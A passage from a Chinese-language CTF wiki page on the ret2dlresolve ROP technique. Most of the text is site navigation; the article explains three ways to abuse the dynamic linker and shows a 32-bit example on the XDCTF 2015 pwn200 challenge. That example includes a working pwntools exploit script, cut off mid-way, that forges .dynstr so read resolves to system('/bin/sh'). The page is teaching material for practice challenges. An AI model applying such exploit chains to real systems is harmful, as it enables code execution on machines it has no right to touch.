class=md-nav__item> <a href=../../../../../../virtualization/parallels/readmd/ class=md-nav__link> Parallels </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7 type=checkbox id=nav-9-7> <label class=md-nav__link for=nav-9-7> Browser <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Browser data-md-level=2> <label class=md-nav__title for=nav-9-7> <span class="md-nav__icon md-icon"></span> Browser </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-1 type=checkbox id=nav-9-7-1> <label class=md-nav__link for=nav-9-7-1> Chrome <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Chrome data-md-level=3> <label class=md-nav__title for=nav-9-7-1> <span class="md-nav__icon md-icon"></span> Chrome </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../browser/chrome/introduction/ class=md-nav__link> Chromium </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-1-2 type=checkbox id=nav-9-7-1-2> <label class=md-nav__link for=nav-9-7-1-2> V8 Engine <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="V8 Engine" data-md-level=4> <label class=md-nav__title for=nav-9-7-1-2> <span class="md-nav__icon md-icon"></span> V8 Engine </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/v8/ class=md-nav__link> V8 Engine Intro </a> </li> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/ignition/ class=md-nav__link> Ignition Interpreter </a> </li> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/turbofan/ class=md-nav__link> TurboFan JIT Compiler </a> </li> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/history/ class=md-nav__link> V8 Design History </a> </li> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/mutable-heap-numbers/ class=md-nav__link> Mutable Heap Numbers </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-2 type=checkbox id=nav-9-7-2> <label class=md-nav__link for=nav-9-7-2> Firefox <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Firefox data-md-level=3> <label class=md-nav__title for=nav-9-7-2> <span class="md-nav__icon md-icon"></span> Firefox </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../browser/firefox/readme/ class=md-nav__link> Firefox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-3 type=checkbox id=nav-9-7-3> <label class=md-nav__link for=nav-9-7-3> Safari <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Safari data-md-level=3> <label class=md-nav__title for=nav-9-7-3> <span class="md-nav__icon md-icon"></span> Safari </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../browser/safari/readme/ class=md-nav__link> Safari </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8 type=checkbox id=nav-9-8> <label class=md-nav__link for=nav-9-8> Hardware <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Hardware data-md-level=2> <label class=md-nav__title for=nav-9-8> <span class="md-nav__icon md-icon"></span> Hardware </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-1 type=checkbox id=nav-9-8-1> <label class=md-nav__link for=nav-9-8-1> CPU <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CPU data-md-level=3> <label class=md-nav__title for=nav-9-8-1> <span class="md-nav__icon md-icon"></span> CPU </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../hardware/cpu/readme/ class=md-nav__link> 簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-1-2 type=checkbox id=nav-9-8-1-2> <label class=md-nav__link for=nav-9-8-1-2> 側信道攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=側信道攻擊 data-md-level=4> <label class=md-nav__title for=nav-9-8-1-2> <span class="md-nav__icon md-icon"></span> 側信道攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../hardware/cpu/side-channel/prefetch/ class=md-nav__link> prefetch side-channel attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-2 type=checkbox id=nav-9-8-2> <label class=md-nav__link for=nav-9-8-2> 可信計算 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=可信計算 data-md-level=3> <label class=md-nav__title for=nav-9-8-2> <span class="md-nav__icon md-icon"></span> 可信計算 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../hardware/trusted-computing/tee/ class=md-nav__link> 可信執行環境 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10 type=checkbox id=nav-10> <label class=md-nav__link for=nav-10> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=nav-10> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_develop/basic_develop/ class=md-nav__link> Android 開發基礎 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2 type=checkbox id=nav-10-2> <label class=md-nav__link for=nav-10-2> Android 運行機制簡述 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 運行機制簡述" data-md-level=2> <label class=md-nav__title for=nav-10-2> <span class="md-nav__icon md-icon"></span> Android 運行機制簡述 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/readme/ class=md-nav__link> Android 應用運行機制簡述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-2 type=checkbox id=nav-10-2-2> <label class=md-nav__link for=nav-10-2-2> Android 中 Java 層的運行機制 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 中 Java 層的運行機制" data-md-level=3> <label class=md-nav__title for=nav-10-2-2> <span class="md-nav__icon md-icon"></span> Android 中 Java 層的運行機制 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/java_layer/readme/ class=md-nav__link> Android 中 Java 層的運行機制 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/java_layer/smali/smali/ class=md-nav__link> Smali </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-2-3 type=checkbox id=nav-10-2-2-3> <label class=md-nav__link for=nav-10-2-2-3> Dex && ODEX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Dex && ODEX" data-md-level=4> <label class=md-nav__title for=nav-10-2-2-3> <span class="md-nav__icon md-icon"></span> Dex && ODEX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/java_layer/dex/dex/ class=md-nav__link> DEX文件 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/java_layer/dex/odex/ class=md-nav__link> ODEX文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-3 type=checkbox id=nav-10-2-3> <label class=md-nav__link for=nav-10-2-3> Android Native 層介紹 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android Native 層介紹" data-md-level=3> <label class=md-nav__title for=nav-10-2-3> <span class="md-nav__icon md-icon"></span> Android Native 層介紹 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/native_layer/so/ class=md-nav__link> so 介紹 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3 type=checkbox id=nav-10-3> <label class=md-nav__link for=nav-10-3> Android 逆向基本介紹 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 逆向基本介紹" data-md-level=2> <label class=md-nav__title for=nav-10-3> <span class="md-nav__icon md-icon"></span> Android 逆向基本介紹 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/overview/ class=md-nav__link> Android 逆向基本介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/android_code_location/ class=md-nav__link> Android 關鍵代碼定位 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3-3 type=checkbox id=nav-10-3-3> <label class=md-nav__link for=nav-10-3-3> Android 簡單靜態分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 簡單靜態分析" data-md-level=3> <label class=md-nav__title for=nav-10-3-3> <span class="md-nav__icon md-icon"></span> Android 簡單靜態分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/static/java-example/ class=md-nav__link> 靜態分析 java 層例子 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/static/so-example/ class=md-nav__link> 靜態分析原生層程序 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/static/complex-example/ class=md-nav__link> 靜態分析綜合題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3-4 type=checkbox id=nav-10-3-4> <label class=md-nav__link for=nav-10-3-4> Android 簡單動態分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 簡單動態分析" data-md-level=3> <label class=md-nav__title for=nav-10-3-4> <span class="md-nav__icon md-icon"></span> Android 簡單動態分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/dynamic/dynamic_debug/ class=md-nav__link> Android 動態調試 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/dynamic/ida_native_debug/ class=md-nav__link> IDA 動態調試原生層程序 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-11 type=checkbox id=nav-11> <label class=md-nav__link for=nav-11> ICS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ICS data-md-level=1> <label class=md-nav__title for=nav-11> <span class="md-nav__icon md-icon"></span> ICS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../ics/ctfs/ class=md-nav__link> ICS_CTF 競賽 </a> </li> <li class=md-nav__item> <a href=../../../../../../../ics/discover/ class=md-nav__link> ICS_CTF 發現 </a> </li> <li class=md-nav__item> <a href=../../../../../../../ics/exploit/ class=md-nav__link> ICS_CTF 利用 </a> </li> <li class=md-nav__item> <a href=../../../../../../../ics/learn/ class=md-nav__link> ICS_CTF 學習資源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12 type=checkbox id=nav-12> <label class=md-nav__link for=nav-12> Blockchain <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Blockchain data-md-level=1> <label class=md-nav__title for=nav-12> <span class="md-nav__icon md-icon"></span> Blockchain </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../blockchain/introduction/ class=md-nav__link> Blockchain Security Overview </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-2 type=checkbox id=nav-12-2> <label class=md-nav__link for=nav-12-2> Ethereum Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Ethereum Security" data-md-level=2> <label class=md-nav__title for=nav-12-2> <span class="md-nav__icon md-icon"></span> Ethereum Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/introduction/ class=md-nav__link> Ethereum Overview </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/basics/ class=md-nav__link> Ethereum Basics </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/selector-encoding/ class=md-nav__link> Function Selector and Argument Encoding </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/storage/ class=md-nav__link> Ethereum Storage </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/opcodes/ class=md-nav__link> Ethereum Opcodes </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-2-6 type=checkbox id=nav-12-2-6> <label class=md-nav__link for=nav-12-2-6> Known Attacks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Known Attacks" data-md-level=3> <label class=md-nav__title for=nav-12-2-6> <span class="md-nav__icon md-icon"></span> Known Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/introduction/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/re-entrancy/ class=md-nav__link> Re-Entrancy </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/overflow-underflow/ class=md-nav__link> Integer Overflow and Underflow </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/randomness/ class=md-nav__link> Randomness </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/airdrop-hunting/ class=md-nav__link> Airdrop Hunting </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/shortaddress/ class=md-nav__link> Short Address Attack </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/delegatecall/ class=md-nav__link> Delegatecall </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/uninitialized-storage-pointer/ class=md-nav__link> Uninitialized Storage Pointer </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/arbitrarywrite/ class=md-nav__link> Arbitrary Writing </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/create2/ class=md-nav__link> CREATE2 </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/jump-oriented-programming/ class=md-nav__link> Jump Oriented Programming </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/reverse/ class=md-nav__link> Smart Contract Reverse </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/resources/ class=md-nav__link> 學習資源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-3 type=checkbox id=nav-12-3> <label class=md-nav__link for=nav-12-3> Public Blockchain Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Public Blockchain Security" data-md-level=2> <label class=md-nav__title for=nav-12-3> <span class="md-nav__icon md-icon"></span> Public Blockchain Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../blockchain/publicblockchain/introduction/ class=md-nav__link> Public Blockchain Security Overview </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/publicblockchain/weaknesses/ class=md-nav__link> Blockchain Weaknesses </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/challenges/ class=md-nav__link> Blockchain Security Challenges </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 原理 </a> <nav class=md-nav aria-label=原理> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1- class=md-nav__link> 思路1 - 直接控制重定位表項的相關內容 </a> </li> <li class=md-nav__item> <a href=#2- class=md-nav__link> 思路2 - 間接控制重定位表項的相關內容 </a> </li> <li class=md-nav__item> <a href=#3-link_map class=md-nav__link> 思路3 - 僞造 link_map </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#32 class=md-nav__link> 32 位例子 </a> <nav class=md-nav aria-label="32 位例子"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#no-relro class=md-nav__link> NO RELRO </a> </li> <li class=md-nav__item> <a href=#partial-relro class=md-nav__link> Partial RELRO </a> <nav class=md-nav aria-label="Partial RELRO"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 手工僞造 </a> <nav class=md-nav aria-label=手工僞造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#stage-1 class=md-nav__link> stage 1 </a> </li> <li class=md-nav__item> <a href=#stage-2 class=md-nav__link> stage 2 </a> </li> <li class=md-nav__item> <a href=#stage-3 class=md-nav__link> stage 3 </a> </li> <li class=md-nav__item> <a href=#stage-4 class=md-nav__link> stage 4 </a> </li> <li class=md-nav__item> <a href=#stage-5 class=md-nav__link> stage 5 </a> </li> <li class=md-nav__item> <a href=#stage-6 class=md-nav__link> stage 6 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 基於工具僞造 </a> <nav class=md-nav aria-label=基於工具僞造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#roputil class=md-nav__link> Roputil </a> </li> <li class=md-nav__item> <a href=#pwntools class=md-nav__link> pwntools </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#full-relro class=md-nav__link> Full RELRO </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#64 class=md-nav__link> 64 位例子 </a> <nav class=md-nav aria-label="64 位例子"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#no-relro_1 class=md-nav__link> NO RELRO </a> </li> <li class=md-nav__item> <a href=#partial-relro_1 class=md-nav__link> Partial RELRO </a> <nav class=md-nav aria-label="Partial RELRO"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 手工僞造 </a> <nav class=md-nav aria-label=手工僞造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#64_1 class=md-nav__link> 64 位的變化 </a> </li> <li class=md-nav__item> <a href=#first-try-leak class=md-nav__link> First Try - leak </a> </li> <li class=md-nav__item> <a href=#second-try-no-leak class=md-nav__link> Second try - no leak </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 基於工具僞造 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#full-relro_1 class=md-nav__link> Full RELRO </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-hitcon-readable class=md-nav__link> 2015-hitcon-readable </a> <nav class=md-nav aria-label=2015-hitcon-readable> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1modify-dynamic-section class=md-nav__link> 方法1：modify dynamic section </a> </li> <li class=md-nav__item> <a href=#2-rop class=md-nav__link> 方法 2 - 標準 ROP </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-hitcon-quals-blinkroot class=md-nav__link> 2015-hitcon-quals-blinkroot </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 總結 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 題目 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 參考 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content> <article class="md-content__inner md-typeset"> <a href=https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve.md title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=ret2dlresolve>ret2dlresolve<a class=headerlink href=#ret2dlresolve title="Permanent link">&para;</a></h1> <p>在學習這個 ROP 利用技巧前，需要首先理解動態鏈接的基本過程以及 ELF 文件中動態鏈接相關的結構。讀者可以參考 executable 部分 ELF 對應的介紹。這裏只給出相應的利用方式。</p> <h2 id=_1>原理<a class=headerlink href=#_1 title="Permanent link">&para;</a></h2> <p>在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 來對動態鏈接的函數進行重定位。那麼如果我們可以控制相應的參數及其對應地址的內容是不是就可以控制解析的函數了呢？答案是肯定的。這也是 ret2dlresolve 攻擊的核心所在。</p> <p>具體的，動態鏈接器在解析符號地址時所使用的重定位表項、動態符號表、動態字符串表都是從目標文件中的動態節 <code>.dynamic</code> 索引得到的。所以如果我們能夠修改其中的某些內容使得最後動態鏈接器解析的符號是我們想要解析的符號，那麼攻擊就達成了。</p> <h3 id=1->思路1 - 直接控制重定位表項的相關內容<a class=headerlink href=#1- title="Permanent link">&para;</a></h3> <p>由於動態鏈接器最後在解析符號的地址時，是依據符號的名字進行解析的。因此，一個很自然的想法是直接修改動態字符串表 <code>.dynstr</code>，比如把某個函數在字符串表中對應的字符串修改爲目標函數對應的字符串。但是，動態字符串表和代碼映射在一起，是隻讀的。此外，類似地，我們可以發現動態符號表、重定位表項都是隻讀的。</p> <p>但是，假如我們可以控制程序執行流，那我們就可以僞造合適的重定位偏移，從而達到調用目標函數的目的。然而，這種方法比較麻煩，因爲我們不僅需要僞造重定位表項，符號信息和字符串信息，而且我們還需要確保動態鏈接器在解析的過程中不會出錯。</p> <h3 id=2->思路2 - 間接控制重定位表項的相關內容<a class=headerlink href=#2- title="Permanent link">&para;</a></h3> <p>既然動態鏈接器會從 <code>.dynamic</code> 節中索引到各個目標節，那如果我們可以修改動態節中的內容，那自然就很容易控制待解析符號對應的字符串，從而達到執行目標函數的目的。</p> <h3 id=3-link_map>思路3 - 僞造 link_map<a class=headerlink href=#3-link_map title="Permanent link">&para;</a></h3> <p>由於動態連接器在解析符號地址時，主要依賴於 link_map 來查詢相關的地址。因此，如果我們可以成功僞造 link_map，也就可以控制程序執行目標函數。</p> <p>下面我們以 2015-XDCTF-pwn200 來介紹 32 位和 64 位下如何使用 ret2dlresolve 技巧。</p> <h2 id=32>32 位例子<a class=headerlink href=#32 title="Permanent link">&para;</a></h2> <h3 id=no-relro>NO RELRO<a class=headerlink href=#no-relro title="Permanent link">&para;</a></h3> <p>首先，我們可以按照下面的方式來編譯對應的文件。</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>gcc<span class=w> </span>-fno-stack-protector<span class=w> </span>-m32<span class=w> </span>-z<span class=w> </span>norelro<span class=w> </span>-no-pie<span class=w> </span>main.c<span class=w> </span>-o<span class=w> </span>main_norelro_32
❯<span class=w> </span>checksec<span class=w> </span>main_no_relro_32
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>No<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
</code></pre></div> <p>在這種情況下，修改 <code>.dynamic</code> 會簡單些。因爲我們只需要修改 <code>.dynamic</code> 節中的字符串表的地址爲僞造的字符串表的地址，並且相應的位置爲目標字符串基本就行了。具體思路如下</p> <ol> <li>修改 .dynamic 節中字符串表的地址爲僞造的地址</li> <li>在僞造的地址處構造好字符串表，將 read 字符串替換爲 system 字符串。</li> <li>在特定的位置讀取 /bin/sh 字符串。</li> <li>調用 read 函數的 plt 的第二條指令，觸發 <code>_dl_runtime_resolve</code> 進行函數解析，從而執行 system 函數。</li> </ol> <p>代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;i386&quot;</span>
<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_32&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_32&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_32&quot;</span><span class=p>)</span>

<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x08049804</span><span class=o>+</span><span class=mi>4</span><span class=p>,</span><span class=mi>4</span><span class=p>)</span> <span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x080498E0</span><span class=p>,</span><span class=nb>len</span><span class=p>((</span><span class=n>dynstr</span><span class=p>)))</span> <span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x080498E0</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>))</span> <span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x08048376</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x080498E0</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span>
<span class=c1># print(rop.dump())</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x080498E0</span><span class=p>))</span>
